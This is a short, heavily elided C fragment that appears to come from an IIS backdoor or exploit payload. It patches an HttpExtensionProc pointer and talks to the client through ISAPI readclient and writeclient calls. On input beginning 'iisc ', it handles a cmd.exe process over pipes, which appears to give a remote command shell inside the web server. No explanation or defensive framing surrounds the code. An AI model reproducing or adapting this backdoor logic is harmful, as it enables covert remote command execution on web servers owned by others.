  ...
  //    *(int *)(dooradd-0x0c)=HttpExtensionProcadd;
    ...
    stradd=k;
	   ...
	   if(thedoor==0){
		...
		//	k=0x20;
			i=*(int *)(ecb+0x6c);
			for(k=0;*(unsigned char *)(i+k)!=0&&k<=0x30;++k){
            }
            writeclient(ConnID,*(int *)(ecb+0x6c),&k,0);
        	k=8;
        	writeclient(ConnID,stradd,&k,0);
	        stradd+=0x10;
...
//			   Sleepadd(20);
		    ...
		    k=readclient(ConnID,Buff,&lBytesRead);
				  ...
				  if(k==1&&lBytesRead>=5&&Buff[0]=='i'&&Buff[1]=='i'&&Buff[2]=='s'&&Buff[3]=='c'&&Buff[4]==' '){
                      ...
                      WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                      TerminateProcessadd(ProcessInformation.hProcess,0);
                      CloseHandleadd(hWritePipe2);
                      CloseHandleadd(hWritePipe1);
                      CloseHandleadd(hReadPipe1);
                      CloseHandleadd(hReadPipe2);
					  CloseHandleadd(ProcessInformation.hThread);
                      CloseHandleadd(ProcessInformation.hProcess);
		              stradd2=Buff+5;
					  Buff[lBytesRead]=0;
					  goto iiscmd;
